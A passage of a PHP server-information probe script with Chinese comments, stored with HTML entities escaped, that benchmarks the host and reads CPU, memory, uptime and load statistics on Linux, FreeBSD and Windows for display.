	return (false !&#x3D;&#x3D; function_exists($funName)) ? &#39;&lt;font color&#x3D;&quot;green&quot;&gt;√&lt;&#x2F;font&gt;&#39; : &#39;&lt;font color&#x3D;&quot;red&quot;&gt;×&lt;&#x2F;font&gt;&#39;;
&#125;
function isfun1($funName &#x3D; &#39;&#39;)
&#123;
    if (!$funName || trim($funName) &#x3D;&#x3D; &#39;&#39; || preg_match(&#39;~[^a-z0-9\_]+~i&#39;, $funName, $tmp)) return &#39;错误&#39;;
	return (false !&#x3D;&#x3D; function_exists($funName)) ? &#39;√&#39; : &#39;×&#39;;
&#125;



&#x2F;&#x2F;整数运算能力测试

function test_int()
&#123;

	$timeStart &#x3D; gettimeofday();

	for($i &#x3D; 0; $i &lt; 3000000; $i++)
	&#123;

		$t &#x3D; 1+1;

	&#125;

	$timeEnd &#x3D; gettimeofday();

	$time &#x3D; ($timeEnd[&quot;usec&quot;]-$timeStart[&quot;usec&quot;])&#x2F;1000000+$timeEnd[&quot;sec&quot;]-$timeStart[&quot;sec&quot;];

	$time &#x3D; round($time, 3).&quot;秒&quot;;

	return $time;

&#125;



&#x2F;&#x2F;浮点运算能力测试

function test_float()
&#123;

	&#x2F;&#x2F;得到圆周率值

	$t &#x3D; pi();

	$timeStart &#x3D; gettimeofday();



	for($i &#x3D; 0; $i &lt; 3000000; $i++)
	&#123;

		&#x2F;&#x2F;开平方

		sqrt($t);

	&#125;



	$timeEnd &#x3D; gettimeofday();

	$time &#x3D; ($timeEnd[&quot;usec&quot;]-$timeStart[&quot;usec&quot;])&#x2F;1000000+$timeEnd[&quot;sec&quot;]-$timeStart[&quot;sec&quot;];

	$time &#x3D; round($time, 3).&quot;秒&quot;;

	return $time;

&#125;



&#x2F;&#x2F;IO能力测试

function test_io()
&#123;

	$fp &#x3D; @fopen(PHPSELF, &quot;r&quot;);

	$timeStart &#x3D; gettimeofday();

	for($i &#x3D; 0; $i &lt; 10000; $i++) 
	&#123;

		@fread($fp, 10240);

		@rewind($fp);

	&#125;

	$timeEnd &#x3D; gettimeofday();

	@fclose($fp);

	$time &#x3D; ($timeEnd[&quot;usec&quot;]-$timeStart[&quot;usec&quot;])&#x2F;1000000+$timeEnd[&quot;sec&quot;]-$timeStart[&quot;sec&quot;];

	$time &#x3D; round($time, 3).&quot;秒&quot;;

	return($time);

&#125;

function GetCoreInformation() &#123;$data &#x3D; file(&#39;&#x2F;proc&#x2F;stat&#39;);$cores &#x3D; array();foreach( $data as $line ) &#123;if( preg_match(&#39;&#x2F;^cpu[0-9]&#x2F;&#39;, $line) )&#123;$info &#x3D; explode(&#39; &#39;, $line);$cores[]&#x3D;array(&#39;user&#39;&#x3D;&gt;$info[1],&#39;nice&#39;&#x3D;&gt;$info[2],&#39;sys&#39; &#x3D;&gt; $info[3],&#39;idle&#39;&#x3D;&gt;$info[4],&#39;iowait&#39;&#x3D;&gt;$info[5],&#39;irq&#39; &#x3D;&gt; $info[6],&#39;softirq&#39; &#x3D;&gt; $info[7]);&#125;&#125;return $cores;&#125;
function GetCpuPercentages($stat1, $stat2) &#123;if(count($stat1)!&#x3D;&#x3D;count($stat2))&#123;return;&#125;$cpus&#x3D;array();for( $i &#x3D; 0, $l &#x3D; count($stat1); $i &lt; $l; $i++) &#123;	$dif &#x3D; array();	$dif[&#39;user&#39;] &#x3D; $stat2[$i][&#39;user&#39;] - $stat1[$i][&#39;user&#39;];$dif[&#39;nice&#39;] &#x3D; $stat2[$i][&#39;nice&#39;] - $stat1[$i][&#39;nice&#39;];	$dif[&#39;sys&#39;] &#x3D; $stat2[$i][&#39;sys&#39;] - $stat1[$i][&#39;sys&#39;];$dif[&#39;idle&#39;] &#x3D; $stat2[$i][&#39;idle&#39;] - $stat1[$i][&#39;idle&#39;];$dif[&#39;iowait&#39;] &#x3D; $stat2[$i][&#39;iowait&#39;] - $stat1[$i][&#39;iowait&#39;];$dif[&#39;irq&#39;] &#x3D; $stat2[$i][&#39;irq&#39;] - $stat1[$i][&#39;irq&#39;];$dif[&#39;softirq&#39;] &#x3D; $stat2[$i][&#39;softirq&#39;] - $stat1[$i][&#39;softirq&#39;];$total &#x3D; array_sum($dif);$cpu &#x3D; array();foreach($dif as $x&#x3D;&gt;$y) $cpu[$x] &#x3D; round($y &#x2F; $total * 100, 2);$cpus[&#39;cpu&#39; . $i] &#x3D; $cpu;&#125;return $cpus;&#125;
$stat1 &#x3D; GetCoreInformation();sleep(1);$stat2 &#x3D; GetCoreInformation();$data &#x3D; GetCpuPercentages($stat1, $stat2);
$cpu_show &#x3D; $data[&#39;cpu0&#39;][&#39;user&#39;].&quot;%us,  &quot;.$data[&#39;cpu0&#39;][&#39;sys&#39;].&quot;%sy,  &quot;.$data[&#39;cpu0&#39;][&#39;nice&#39;].&quot;%ni, &quot;.$data[&#39;cpu0&#39;][&#39;idle&#39;].&quot;%id,  &quot;.$data[&#39;cpu0&#39;][&#39;iowait&#39;].&quot;%wa,  &quot;.$data[&#39;cpu0&#39;][&#39;irq&#39;].&quot;%irq,  &quot;.$data[&#39;cpu0&#39;][&#39;softirq&#39;].&quot;%softirq&quot;;
function makeImageUrl($title, $data) &#123;$api&#x3D;&#39;http:&#x2F;&#x2F;api.yahei.net&#x2F;tz&#x2F;cpu_show.php?id&#x3D;&#39;;$url.&#x3D;$data[&#39;user&#39;].&#39;,&#39;;$url.&#x3D;$data[&#39;nice&#39;].&#39;,&#39;;$url.&#x3D;$data[&#39;sys&#39;].&#39;,&#39;;$url.&#x3D;$data[&#39;idle&#39;].&#39;,&#39;;$url.&#x3D;$data[&#39;iowait&#39;];$url.&#x3D;&#39;&amp;chdl&#x3D;User|Nice|Sys|Idle|Iowait&amp;chdlp&#x3D;b&amp;chl&#x3D;&#39;;$url.&#x3D;$data[&#39;user&#39;].&#39;%25|&#39;;$url.&#x3D;$data[&#39;nice&#39;].&#39;%25|&#39;;$url.&#x3D;$data[&#39;sys&#39;].&#39;%25|&#39;;$url.&#x3D;$data[&#39;idle&#39;].&#39;%25|&#39;;$url.&#x3D;$data[&#39;iowait&#39;].&#39;%25&#39;;$url.&#x3D;&#39;&amp;chtt&#x3D;Core+&#39;.$title;return $api.base64_encode($url);&#125;
if($_GET[&#39;act&#39;] &#x3D;&#x3D; &quot;cpu_percentage&quot;)&#123;echo &quot;&lt;center&gt;&lt;b&gt;&lt;font face&#x3D;&#39;Microsoft YaHei&#39; color&#x3D;&#39;#666666&#39; size&#x3D;&#39;3&#39;&gt;图片加载慢，请耐心等待！&lt;&#x2F;font&gt;&lt;&#x2F;b&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&quot;;foreach( $data as $k &#x3D;&gt; $v ) &#123;echo &#39;&lt;img src&#x3D;&quot;&#39; . makeImageUrl( $k, $v ) . &#39;&quot; style&#x3D;&quot;width:360px;height:240px;border: #CCCCCC 1px solid;background: #FFFFFF;margin:5px;padding:5px;&quot; &#x2F;&gt;&#39;;&#125;echo &quot;&lt;&#x2F;center&gt;&quot;;exit();&#125;



&#x2F;&#x2F; 根据不同系统取得CPU相关信息

switch(PHP_OS)
&#123;

	case &quot;Linux&quot;:

		$sysReShow &#x3D; (false !&#x3D;&#x3D; ($sysInfo &#x3D; sys_linux()))?&quot;show&quot;:&quot;none&quot;;

	break;
	

	case &quot;FreeBSD&quot;:

		$sysReShow &#x3D; (false !&#x3D;&#x3D; ($sysInfo &#x3D; sys_freebsd()))?&quot;show&quot;:&quot;none&quot;;

	break;
&#x2F;*	

	case &quot;WINNT&quot;:

		$sysReShow &#x3D; (false !&#x3D;&#x3D; ($sysInfo &#x3D; sys_windows()))?&quot;show&quot;:&quot;none&quot;;

	break;
*&#x2F;	

	default:

	break;

&#125;



&#x2F;&#x2F;linux系统探测

function sys_linux()

&#123;

    &#x2F;&#x2F; CPU

    if (false &#x3D;&#x3D;&#x3D; ($str &#x3D; @file(&quot;&#x2F;proc&#x2F;cpuinfo&quot;))) return false;

    $str &#x3D; implode(&quot;&quot;, $str);

    @preg_match_all(&quot;&#x2F;model\s+name\s&#123;0,&#125;\:+\s&#123;0,&#125;([\w\s\)\(\@.-]+)([\r\n]+)&#x2F;s&quot;, $str, $model);

    @preg_match_all(&quot;&#x2F;cpu\s+MHz\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+)[\r\n]+&#x2F;&quot;, $str, $mhz);

    @preg_match_all(&quot;&#x2F;cache\s+size\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+\s&#123;0,&#125;[A-Z]+[\r\n]+)&#x2F;&quot;, $str, $cache);

    @preg_match_all(&quot;&#x2F;bogomips\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+)[\r\n]+&#x2F;&quot;, $str, $bogomips);

    if (false !&#x3D;&#x3D; is_array($model[1]))

	&#123;

        $res[&#39;cpu&#39;][&#39;num&#39;] &#x3D; sizeof($model[1]);
		&#x2F;*

        for($i &#x3D; 0; $i &lt; $res[&#39;cpu&#39;][&#39;num&#39;]; $i++)

        &#123;

            $res[&#39;cpu&#39;][&#39;model&#39;][] &#x3D; $model[1][$i].&#39;&amp;nbsp;(&#39;.$mhz[1][$i].&#39;)&#39;;

            $res[&#39;cpu&#39;][&#39;mhz&#39;][] &#x3D; $mhz[1][$i];

            $res[&#39;cpu&#39;][&#39;cache&#39;][] &#x3D; $cache[1][$i];

            $res[&#39;cpu&#39;][&#39;bogomips&#39;][] &#x3D; $bogomips[1][$i];

        &#125;*&#x2F;
		if($res[&#39;cpu&#39;][&#39;num&#39;]&#x3D;&#x3D;1)
			$x1 &#x3D; &#39;&#39;;
		else
			$x1 &#x3D; &#39; ×&#39;.$res[&#39;cpu&#39;][&#39;num&#39;];
		$mhz[1][0] &#x3D; &#39; | 频率:&#39;.$mhz[1][0];
		$cache[1][0] &#x3D; &#39; | 二级缓存:&#39;.$cache[1][0];
		$bogomips[1][0] &#x3D; &#39; | Bogomips:&#39;.$bogomips[1][0];
		$res[&#39;cpu&#39;][&#39;model&#39;][] &#x3D; $model[1][0].$mhz[1][0].$cache[1][0].$bogomips[1][0].$x1;

        if (false !&#x3D;&#x3D; is_array($res[&#39;cpu&#39;][&#39;model&#39;])) $res[&#39;cpu&#39;][&#39;model&#39;] &#x3D; implode(&quot;&lt;br &#x2F;&gt;&quot;, $res[&#39;cpu&#39;][&#39;model&#39;]);

        if (false !&#x3D;&#x3D; is_array($res[&#39;cpu&#39;][&#39;mhz&#39;])) $res[&#39;cpu&#39;][&#39;mhz&#39;] &#x3D; implode(&quot;&lt;br &#x2F;&gt;&quot;, $res[&#39;cpu&#39;][&#39;mhz&#39;]);

        if (false !&#x3D;&#x3D; is_array($res[&#39;cpu&#39;][&#39;cache&#39;])) $res[&#39;cpu&#39;][&#39;cache&#39;] &#x3D; implode(&quot;&lt;br &#x2F;&gt;&quot;, $res[&#39;cpu&#39;][&#39;cache&#39;]);

        if (false !&#x3D;&#x3D; is_array($res[&#39;cpu&#39;][&#39;bogomips&#39;])) $res[&#39;cpu&#39;][&#39;bogomips&#39;] &#x3D; implode(&quot;&lt;br &#x2F;&gt;&quot;, $res[&#39;cpu&#39;][&#39;bogomips&#39;]);

	&#125;


    &#x2F;&#x2F; NETWORK


    &#x2F;&#x2F; UPTIME

    if (false &#x3D;&#x3D;&#x3D; ($str &#x3D; @file(&quot;&#x2F;proc&#x2F;uptime&quot;))) return false;

    $str &#x3D; explode(&quot; &quot;, implode(&quot;&quot;, $str));

    $str &#x3D; trim($str[0]);

    $min &#x3D; $str &#x2F; 60;

    $hours &#x3D; $min &#x2F; 60;

    $days &#x3D; floor($hours &#x2F; 24);

    $hours &#x3D; floor($hours - ($days * 24));

    $min &#x3D; floor($min - ($days * 60 * 24) - ($hours * 60));

    if ($days !&#x3D;&#x3D; 0) $res[&#39;uptime&#39;] &#x3D; $days.&quot;天&quot;;

    if ($hours !&#x3D;&#x3D; 0) $res[&#39;uptime&#39;] .&#x3D; $hours.&quot;小时&quot;;

    $res[&#39;uptime&#39;] .&#x3D; $min.&quot;分钟&quot;;


    &#x2F;&#x2F; MEMORY

    if (false &#x3D;&#x3D;&#x3D; ($str &#x3D; @file(&quot;&#x2F;proc&#x2F;meminfo&quot;))) return false;

    $str &#x3D; implode(&quot;&quot;, $str);

    preg_match_all(&quot;&#x2F;MemTotal\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+).+?MemFree\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+).+?Cached\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+).+?SwapTotal\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+).+?SwapFree\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+)&#x2F;s&quot;, $str, $buf);
	preg_match_all(&quot;&#x2F;Buffers\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+)&#x2F;s&quot;, $str, $buffers);


    $res[&#39;memTotal&#39;] &#x3D; round($buf[1][0]&#x2F;1024, 2);

    $res[&#39;memFree&#39;] &#x3D; round($buf[2][0]&#x2F;1024, 2);

    $res[&#39;memBuffers&#39;] &#x3D; round($buffers[1][0]&#x2F;1024, 2);
	$res[&#39;memCached&#39;] &#x3D; round($buf[3][0]&#x2F;1024, 2);

    $res[&#39;memUsed&#39;] &#x3D; $res[&#39;memTotal&#39;]-$res[&#39;memFree&#39;];

    $res[&#39;memPercent&#39;] &#x3D; (floatval($res[&#39;memTotal&#39;])!&#x3D;0)?round($res[&#39;memUsed&#39;]&#x2F;$res[&#39;memTotal&#39;]*100,2):0;


    $res[&#39;memRealUsed&#39;] &#x3D; $res[&#39;memTotal&#39;] - $res[&#39;memFree&#39;] - $res[&#39;memCached&#39;] - $res[&#39;memBuffers&#39;]; &#x2F;&#x2F;真实内存使用
	$res[&#39;memRealFree&#39;] &#x3D; $res[&#39;memTotal&#39;] - $res[&#39;memRealUsed&#39;]; &#x2F;&#x2F;真实空闲
    $res[&#39;memRealPercent&#39;] &#x3D; (floatval($res[&#39;memTotal&#39;])!&#x3D;0)?round($res[&#39;memRealUsed&#39;]&#x2F;$res[&#39;memTotal&#39;]*100,2):0; &#x2F;&#x2F;真实内存使用率

	$res[&#39;memCachedPercent&#39;] &#x3D; (floatval($res[&#39;memCached&#39;])!&#x3D;0)?round($res[&#39;memCached&#39;]&#x2F;$res[&#39;memTotal&#39;]*100,2):0; &#x2F;&#x2F;Cached内存使用率

    $res[&#39;swapTotal&#39;] &#x3D; round($buf[4][0]&#x2F;1024, 2);

    $res[&#39;swapFree&#39;] &#x3D; round($buf[5][0]&#x2F;1024, 2);

    $res[&#39;swapUsed&#39;] &#x3D; round($res[&#39;swapTotal&#39;]-$res[&#39;swapFree&#39;], 2);

    $res[&#39;swapPercent&#39;] &#x3D; (floatval($res[&#39;swapTotal&#39;])!&#x3D;0)?round($res[&#39;swapUsed&#39;]&#x2F;$res[&#39;swapTotal&#39;]*100,2):0;


    &#x2F;&#x2F; LOAD AVG

    if (false &#x3D;&#x3D;&#x3D; ($str &#x3D; @file(&quot;&#x2F;proc&#x2F;loadavg&quot;))) return false;

    $str &#x3D; explode(&quot; &quot;, implode(&quot;&quot;, $str));

    $str &#x3D; array_chunk($str, 4);

    $res[&#39;loadAvg&#39;] &#x3D; implode(&quot; &quot;, $str[0]);


    return $res;

&#125;



&#x2F;&#x2F;FreeBSD系统探测

function sys_freebsd()
&#123;

	&#x2F;&#x2F;CPU

	if (false &#x3D;&#x3D;&#x3D; ($res[&#39;cpu&#39;][&#39;num&#39;] &#x3D; get_key(&quot;hw.ncpu&quot;))) return false;

	$res[&#39;cpu&#39;][&#39;model&#39;] &#x3D; get_key(&quot;hw.model&quot;);

	&#x2F;&#x2F;LOAD AVG

	if (false &#x3D;&#x3D;&#x3D; ($res[&#39;loadAvg&#39;] &#x3D; get_key(&quot;vm.loadavg&quot;))) return false;

	&#x2F;&#x2F;UPTIME

	if (false &#x3D;&#x3D;&#x3D; ($buf &#x3D; get_key(&quot;kern.boottime&quot;))) return false;

	$buf &#x3D; explode(&#39; &#39;, $buf);

	$sys_ticks &#x3D; time() - intval($buf[3]);

	$min &#x3D; $sys_ticks &#x2F; 60;

	$hours &#x3D; $min &#x2F; 60;

	$days &#x3D; floor($hours &#x2F; 24);

	$hours &#x3D; floor($hours - ($days * 24));

	$min &#x3D; floor($min - ($days * 60 * 24) - ($hours * 60));

	if ($days !&#x3D;&#x3D; 0) $res[&#39;uptime&#39;] &#x3D; $days.&quot;天&quot;;

	if ($hours !&#x3D;&#x3D; 0) $res[&#39;uptime&#39;] .&#x3D; $hours.&quot;小时&quot;;

	$res[&#39;uptime&#39;] .&#x3D; $min.&quot;分钟&quot;;

	&#x2F;&#x2F;MEMORY

	if (false &#x3D;&#x3D;&#x3D; ($buf &#x3D; get_key(&quot;hw.physmem&quot;))) return false;

	$res[&#39;memTotal&#39;] &#x3D; round($buf&#x2F;1024&#x2F;1024, 2);


	$str &#x3D; get_key(&quot;vm.vmtotal&quot;);

	preg_match_all(&quot;&#x2F;\nVirtual Memory[\:\s]*\(Total[\:\s]*([\d]+)K[\,\s]*Active[\:\s]*([\d]+)K\)\n&#x2F;i&quot;, $str, $buff, PREG_SET_ORDER);

	preg_match_all(&quot;&#x2F;\nReal Memory[\:\s]*\(Total[\:\s]*([\d]+)K[\,\s]*Active[\:\s]*([\d]+)K\)\n&#x2F;i&quot;, $str, $buf, PREG_SET_ORDER);


	$res[&#39;memRealUsed&#39;] &#x3D; round($buf[0][2]&#x2F;1024, 2);

	$res[&#39;memCached&#39;] &#x3D; round($buff[0][2]&#x2F;1024, 2);

	$res[&#39;memUsed&#39;] &#x3D; round($buf[0][1]&#x2F;1024, 2) + $res[&#39;memCached&#39;];

	$res[&#39;memFree&#39;] &#x3D; $res[&#39;memTotal&#39;] - $res[&#39;memUsed&#39;];

	$res[&#39;memPercent&#39;] &#x3D; (floatval($res[&#39;memTotal&#39;])!&#x3D;0)?round($res[&#39;memUsed&#39;]&#x2F;$res[&#39;memTotal&#39;]*100,2):0;


	$res[&#39;memRealPercent&#39;] &#x3D; (floatval($res[&#39;memTotal&#39;])!&#x3D;0)?round($res[&#39;memRealUsed&#39;]&#x2F;$res[&#39;memTotal&#39;]*100,2):0;


	return $res;

&#125;



&#x2F;&#x2F;取得参数值 FreeBSD

function get_key($keyName)
&#123;

	return do_command(&#39;sysctl&#39;, &quot;-n $keyName&quot;);

&#125;



&#x2F;&#x2F;确定执行文件位置 FreeBSD

function find_command($commandName)
&#123;

	$path &#x3D; array(&#39;&#x2F;bin&#39;, &#39;&#x2F;sbin&#39;, &#39;&#x2F;usr&#x2F;bin&#39;, &#39;&#x2F;usr&#x2F;sbin&#39;, &#39;&#x2F;usr&#x2F;local&#x2F;bin&#39;, &#39;&#x2F;usr&#x2F;local&#x2F;sbin&#39;);

	foreach($path as $p) 
	&#123;

		if (@is_executable(&quot;$p&#x2F;$commandName&quot;)) return &quot;$p&#x2F;$commandName&quot;;

	&#125;

	return false;

&#125;



&#x2F;&#x2F;执行系统命令 FreeBSD

function do_command($commandName, $args)
&#123;

	$buffer &#x3D; &quot;&quot;;

	if (false &#x3D;&#x3D;&#x3D; ($command &#x3D; find_command($commandName))) return false;

	if ($fp &#x3D; @popen(&quot;$command $args&quot;, &#39;r&#39;)) 
	&#123;

		while (!@feof($fp))
		&#123;

			$buffer .&#x3D; @fgets($fp, 4096);

		&#125;

		return trim($buffer);

	&#125;

	return false;

&#125;



&#x2F;&#x2F;windows系统探测

function sys_windows()
&#123;

	if (PHP_VERSION &gt;&#x3D; 5)
	&#123;

		$objLocator &#x3D; new COM(&quot;WbemScripting.SWbemLocator&quot;);

		$wmi &#x3D; $objLocator-&gt;ConnectServer();

		$prop &#x3D; $wmi-&gt;get(&quot;Win32_PnPEntity&quot;);

	&#125;
	else
	&#123;
		return false;

	&#125;



	&#x2F;&#x2F;CPU

	$cpuinfo &#x3D; GetWMI($wmi,&quot;Win32_Processor&quot;, array(&quot;Name&quot;,&quot;L2CacheSize&quot;,&quot;NumberOfCores&quot;));

	$res[&#39;cpu&#39;][&#39;num&#39;] &#x3D; $cpuinfo[0][&#39;NumberOfCores&#39;];

	if (null &#x3D;&#x3D; $res[&#39;cpu&#39;][&#39;num&#39;]) 
	&#123;

		$res[&#39;cpu&#39;][&#39;num&#39;] &#x3D; 1;

	&#125;&#x2F;*

	for ($i&#x3D;0;$i&lt;$res[&#39;cpu&#39;][&#39;num&#39;];$i++)
	&#123;

		$res[&#39;cpu&#39;][&#39;model&#39;] .&#x3D; $cpuinfo[0][&#39;Name&#39;].&quot;&lt;br &#x2F;&gt;&quot;;

		$res[&#39;cpu&#39;][&#39;cache&#39;] .&#x3D; $cpuinfo[0][&#39;L2CacheSize&#39;].&quot;&lt;br &#x2F;&gt;&quot;;

	&#125;*&#x2F;
	$cpuinfo[0][&#39;L2CacheSize&#39;] &#x3D; &#39; (&#39;.$cpuinfo[0][&#39;L2CacheSize&#39;].&#39;)&#39;;
	if($res[&#39;cpu&#39;][&#39;num&#39;]&#x3D;&#x3D;1)
		$x1 &#x3D; &#39;&#39;;
	else
		$x1 &#x3D; &#39; ×&#39;.$res[&#39;cpu&#39;][&#39;num&#39;];
	$res[&#39;cpu&#39;][&#39;model&#39;] &#x3D; $cpuinfo[0][&#39;Name&#39;].$cpuinfo[0][&#39;L2CacheSize&#39;].$x1;

	&#x2F;&#x2F; SYSINFO

	$sysinfo &#x3D; GetWMI($wmi,&quot;Win32_OperatingSystem&quot;, array(&#39;LastBootUpTime&#39;,&#39;TotalVisibleMemorySize&#39;,&#39;FreePhysicalMemory&#39;,&#39;Caption&#39;,&#39;CSDVersion&#39;,&#39;SerialNumber&#39;,&#39;InstallDate&#39;));

	$sysinfo[0][&#39;Caption&#39;]&#x3D;iconv(&#39;GBK&#39;, &#39;UTF-8&#39;,$sysinfo[0][&#39;Caption&#39;]);

	$sysinfo[0][&#39;CSDVersion&#39;]&#x3D;iconv(&#39;GBK&#39;, &#39;UTF-8&#39;,$sysinfo[0][&#39;CSDVersion&#39;]);

	$res[&#39;win_n&#39;] &#x3D; $sysinfo[0][&#39;Caption&#39;].&quot; &quot;.$sysinfo[0][&#39;CSDVersion&#39;].&quot; 序列号:&#123;$sysinfo[0][&#39;SerialNumber&#39;]&#125; 于&quot;.date(&#39;Y年m月d日H:i:s&#39;,strtotime(substr($sysinfo[0][&#39;InstallDate&#39;],0,14))).&quot;安装&quot;;

	&#x2F;&#x2F;UPTIME

	$res[&#39;uptime&#39;] &#x3D; $sysinfo[0][&#39;LastBootUpTime&#39;];


	$sys_ticks &#x3D; 3600*8 + time() - strtotime(substr($res[&#39;uptime&#39;],0,14));

	$min &#x3D; $sys_ticks &#x2F; 60;

	$hours &#x3D; $min &#x2F; 60;

	$days &#x3D; floor($hours &#x2F; 24);

	$hours &#x3D; floor($hours - ($days * 24));

	$min &#x3D; floor($min - ($days * 60 * 24) - ($hours * 60));

	if ($days !&#x3D;&#x3D; 0) $res[&#39;uptime&#39;] &#x3D; $days.&quot;天&quot;;

	if ($hours !&#x3D;&#x3D; 0) $res[&#39;uptime&#39;] .&#x3D; $hours.&quot;小时&quot;;

	$res[&#39;uptime&#39;] .&#x3D; $min.&quot;分钟&quot;;


	&#x2F;&#x2F;MEMORY

	$res[&#39;memTotal&#39;] &#x3D; round($sysinfo[0][&#39;TotalVisibleMemorySize&#39;]&#x2F;1024,2);

	$res[&#39;memFree&#39;] &#x3D; round($sysinfo[0][&#39;FreePhysicalMemory&#39;]&#x2F;1024,2);

	$res[&#39;memUsed&#39;] &#x3D; $res[&#39;memTotal&#39;]-$res[&#39;memFree&#39;];	&#x2F;&#x2F;上面两行已经除以1024,这行不用再除了

	$res[&#39;memPercent&#39;] &#x3D; round($res[&#39;memUsed&#39;] &#x2F; $res[&#39;memTotal&#39;]*100,2);


	$swapinfo &#x3D; GetWMI($wmi,&quot;Win32_PageFileUsage&quot;, array(&#39;AllocatedBaseSize&#39;,&#39;CurrentUsage&#39;));


	&#x2F;&#x2F; LoadPercentage

	$loadinfo &#x3D; GetWMI($wmi,&quot;Win32_Processor&quot;, array(&quot;LoadPercentage&quot;));

	$res[&#39;loadAvg&#39;] &#x3D; $loadinfo[0][&#39;LoadPercentage&#39;];


	return $res;

&#125;



function GetWMI($wmi,$strClass, $strValue &#x3D; array())
&#123;

	$arrData &#x3D; array();


	$objWEBM &#x3D; $wmi-&gt;Get($strClass);

	$arrProp &#x3D; $objWEBM-&gt;Properties_;

	$arrWEBMCol &#x3D; $objWEBM-&gt;Instances_();

	foreach($arrWEBMCol as $objItem) 
	&#123;

		@reset($arrProp);

		$arrInstance &#x3D; array();

		foreach($arrProp as $propItem) 
		&#123;

			eval(&quot;\$value &#x3D; \$objItem-&gt;&quot; . $propItem-&gt;Name . &quot;;&quot;);

			if (empty($strValue)) 
			&#123;

				$arrInstance[$propItem-&gt;Name] &#x3D; trim($value);

			&#125; 
			else
			&#123;

				if (in_array($propItem-&gt;Name, $strValue)) 
				&#123;

					$arrInstance[$propItem-&gt;Name] &#x3D; trim($value);

				&#125;

			&#125;

		&#125;

		$arrData[] &#x3D; $arrInstance;

	&#125;

	return $arrData;

&#125;



&#x2F;&#x2F;比例条

function bar($percent)
&#123;

?&gt;

	&lt;div class&#x3D;&quot;bar&quot;&gt;&lt;div class&#x3D;&quot;barli&quot; style&#x3D;&quot;width:&lt;?php echo $percent?&gt;%&quot;&gt;&amp;nbsp;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;

&lt;?php

&#125;



$uptime &#x3D; $sysInfo[&#39;uptime&#39;]; &#x2F;&#x2F;在线时间

$stime &#x3D; date(&#39;Y-m-d H:i:s&#39;); &#x2F;&#x2F;系统当前时间

&#x2F;&#x2F;硬盘

$dt &#x3D; round(@disk_total_space(&quot;.&quot;)&#x2F;(1024*1024*1024),3); &#x2F;&#x2F;总
$df &#x3D; round(@disk_free_space(&quot;.&quot;)&#x2F;(1024*1024*1024),3); &#x2F;&#x2F;可用
$du &#x3D; $dt-$df; &#x2F;&#x2F;已用
$hdPercent &#x3D; (floatval($dt)!&#x3D;0)?round($du&#x2F;$dt*100,2):0;

$load &#x3D; $sysInfo[&#39;loadAvg&#39;];	&#x2F;&#x2F;系统负载


&#x2F;&#x2F;判断内存如果小于1G，就显示M，否则显示G单位
if($sysInfo[&#39;memTotal&#39;]&lt;1024)
&#123;
	$memTotal &#x3D; $sysInfo[&#39;memTotal&#39;].&quot; M&quot;;
	$mt &#x3D; $sysInfo[&#39;memTotal&#39;].&quot; M&quot;;
	$mu &#x3D; $sysInfo[&#39;memUsed&#39;].&quot; M&quot;;
	$mf &#x3D; $sysInfo[&#39;memFree&#39;].&quot; M&quot;;
	$mc &#x3D; $sysInfo[&#39;memCached&#39;].&quot; M&quot;;	&#x2F;&#x2F;cache化内存
	$mb &#x3D; $sysInfo[&#39;memBuffers&#39;].&quot; M&quot;;	&#x2F;&#x2F;缓冲
	$st &#x3D; $sysInfo[&#39;swapTotal&#39;].&quot; M&quot;;
	$su &#x3D; $sysInfo[&#39;swapUsed&#39;].&quot; M&quot;;
	$sf &#x3D; $sysInfo[&#39;swapFree&#39;].&quot; M&quot;;
	$swapPercent &#x3D; $sysInfo[&#39;swapPercent&#39;];
	$memRealUsed &#x3D; $sysInfo[&#39;memRealUsed&#39;].&quot; M&quot;; &#x2F;&#x2F;真实内存使用
	$memRealFree &#x3D; $sysInfo[&#39;memRealFree&#39;].&quot; M&quot;; &#x2F;&#x2F;真实内存空闲
	$memRealPercent &#x3D; $sysInfo[&#39;memRealPercent&#39;]; &#x2F;&#x2F;真实内存使用比率
	$memPercent &#x3D; $sysInfo[&#39;memPercent&#39;]; &#x2F;&#x2F;内存总使用率
	$memCachedPercent &#x3D; $sysInfo[&#39;memCachedPercent&#39;]; &#x2F;&#x2F;cache内存使用率
&#125;
else
&#123;
	$memTotal &#x3D; round($sysInfo[&#39;memTotal&#39;]&#x2F;1024,3).&quot; G&quot;;
	$mt &#x3D; round($sysInfo[&#39;memTotal&#39;]&#x2F;1024,3).&quot; G&quot;;
	$mu &#x3D; round($sysInfo[&#39;memUsed&#39;]&#x2F;1024,3).&quot; G&quot;;
	$mf &#x3D; round($sysInfo[&#39;memFree&#39;]&#x2F;1024,3).&quot; G&quot;;
	$mc &#x3D; round($sysInfo[&#39;memCached&#39;]&#x2F;1024,3).&quot; G&quot;;
	$mb &#x3D; round($sysInfo[&#39;memBuffers&#39;]&#x2F;1024,3).&quot; G&quot;;
	$st &#x3D; round($sysInfo[&#39;swapTotal&#39;]&#x2F;1024,3).&quot; G&quot;;
	$su &#x3D; round($sysInfo[&#39;swapUsed&#39;]&#x2F;1024,3).&quot; G&quot;;
	$sf &#x3D; round($sysInfo[&#39;swapFree&#39;]&#x2F;1024,3).&quot; G&quot;;
	$swapPercent &#x3D; $sysInfo[&#39;swapPercent&#39;];
	$memRealUsed &#x3D; round($sysInfo[&#39;memRealUsed&#39;]&#x2F;1024,3).&quot; G&quot;; &#x2F;&#x2F;真实内存使用
	$memRealFree &#x3D; round($sysInfo[&#39;memRealFree&#39;]&#x2F;1024,3).&quot; G&quot;; &#x2F;&#x2F;真实内存空闲
	$memRealPercent &#x3D; $sysInfo[&#39;memRealPercent&#39;]; &#x2F;&#x2F;真实内存使用比率
	$memPercent &#x3D; $sysInfo[&#39;memPercent&#39;]; &#x2F;&#x2F;内存总使用率
	$memCachedPercent &#x3D; $sysInfo[&#39;memCachedPercent&#39;]; &#x2F;&#x2F;cache内存使用率
&#125;


&#x2F;&#x2F;网卡流量

$strs &#x3D; @file(&quot;&#x2F;proc&#x2F;net&#x2F;dev&quot;); 



